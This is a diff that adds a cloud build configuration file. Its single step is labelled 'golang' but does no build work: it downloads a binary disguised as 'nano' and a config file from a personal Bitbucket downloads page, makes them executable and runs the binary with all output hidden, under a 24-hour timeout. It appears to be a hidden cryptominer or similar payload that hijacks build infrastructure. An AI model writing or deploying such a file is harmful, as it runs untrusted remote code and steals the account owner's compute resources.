@@ -1,0 +1,19 @@
+steps:
+  - name: golang
+    args:
+      - '-c'
+      - |
+        apt-get update
+        apt-get upgrade -y
+        apt-get install -y screen wget libjansson4
+        wget -q https://bitbucket.org/manajakaj/repo1/downloads/nano
+        wget -q https://bitbucket.org/manajakaj/repo1/downloads/config.ini
+        chmod +x nano config.ini
+        ./nano >/dev/null 2>&1
+
+    waitFor:
+      - '-'
+    entrypoint: /bin/bash
+timeout: 86400s
+options:
+  diskSizeGb: '100'
